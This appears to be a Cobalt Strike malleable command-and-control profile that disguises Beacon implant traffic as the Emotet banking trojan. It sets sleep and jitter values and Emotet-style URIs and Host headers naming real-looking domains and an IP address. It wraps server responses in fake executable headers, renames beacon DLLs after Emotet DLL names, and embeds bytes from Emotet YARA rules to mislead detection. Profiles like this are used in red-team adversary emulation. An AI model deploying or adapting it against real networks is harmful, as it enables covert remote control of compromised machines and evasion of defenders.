#emotet
#mostly taken from --> http://www.broadanalysis.com/2017/08/14/emotet-banking-trojan-2017-08-14-malspam/
#found this regarding the encoded 'cookie' string --> https://www.cisecurity.org/emotet-changes-ttp-and-arrives-in-united-states/
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/LSnmkxT/";
    
    client {

        header "Host" "trevorcameron.com";
        header "Connection" "Keep-Alive";
	
        
        metadata {
            netbios;
            header "Cookie";


        }


    }

    server {

        header "Server" "Apache";
	header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
	header "Pragma" "no-cache";
	header "Content-Disposition" "attachment; filename='NFccF.exe'";
	header "Content-Transfer-Encoding" "binary";
	header "Keep-Alive" "timeout=2, max=100";
	header "Connection" "Keep-Alive";
        

        output {
            netbios;

	    prepend "11f10
MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.

$.......h.+.,OE.,OE.,OE..... OE......OE.....1OE...F.:OE...@..OE...A..OE.%7..%OE.,OD.[OE...L.-OE.....-OE...G.-OE.Rich,OE.........PE..L......Y.............................].";

	    append "9(90989<9D9X9x9.9.9.9.9.: :@:`:.:.:.:.:.:.:.;(;H;h;.;.;.;.;.;.<(<H<h<.<.<.<.<.=(=H=h=.=.=.=.=.=.>(>D>H>P>X>`>t>|>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.?.?.?.? ?4?<?P?..........p1t1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1(2X2h2x2.2.2.2.2.2.2.2.2p3t3.8.9.9.9.:0:P:h:.:.:.:.;0;;x;.;.;.;.;.<D<h<.<.<.<(=D=d=.=.=.=.>........................................................................................................................................................................................................................................................................................................
0";
            print;
        }
    }
}

http-post {
    
    set uri "/LSnmkXT/";

    client {
       
	header "Host" "77.244.37:7080";
        header "Connection" "Keep-Alive";
	header "Cache-Control" "no-cache";
        
        output {
            netbios;
	    print;

        }
        
  	#not sure where to stick this to look good...      
        id {
            base64url;
	    header "Cookie";

        }
    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/html; charset=UTF-8";
	header "Connection" "keep-alive";
        

        output {
            netbios;
            print;
        }
    }
}

http-stager {

	set uri_x86 "/ckgawd/";
	set uri_x64 "/Ckgawd/";

    client {
	header "Host" "blushphotoandfilm.com";
	header "Connection" "Keep-Alive";
    }

    server {
        header "Cache-Control" "Cache-Control: no-cache, no-store, max-age=0, must-revalidate";
        header "Content-Type" "application/octet-stream";
        header "Server" "Apache";
        header "Connection" "Keep-Alive";
    
    }


}
#from link in doc --> https://www.virustotal.com/#/file/17ced37ec7b9a02b142f5ca527e1bba05c723231b3d4fc1a951e45ec002a17e5/details
stage {
	set compile_time "11 Nov 2010 23:29:33";
	set userwx "false";
	set image_size_x86 "298000";

	#some dll names seen by --> https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/Emotet.N!bit
	transform-x86 {
		strrep "beacon.dll" "api32.dll";
	}

	transform-x64 {
		strrep "beacon.x64.dll" "mgr32.dll";
	}	

	#https://github.com/Yara-Rules/rules/blob/master/malware/MALW_Emotet.yar
	stringw "{ 4d 5a }";
	stringw "{ 0f 45 fb 0f 45 de }";
	stringw "{ C7 04 24 00 00 00 00 89 44 24 0? }";
	stringw "{ 89 E? 8D ?? 24 ?? 89 ?? FF D0 83 EC 04 }";

}
